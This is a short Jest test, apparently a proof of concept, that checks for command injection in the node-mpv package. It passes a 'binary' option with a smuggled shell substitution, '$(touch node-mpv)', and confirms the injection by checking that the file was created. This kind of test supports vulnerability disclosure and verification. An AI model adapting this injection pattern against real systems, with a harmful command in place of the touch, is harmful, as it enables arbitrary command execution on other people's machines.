test("Command Injection in node-mpv", () => {
  expect.assertions(2);
  const Root = require("node-mpv");
  const fs = require("fs");
  const path = "./node-mpv";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var options = { binary: '" $(touch node-mpv) "' };
  try {
    var root = new Root(options);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
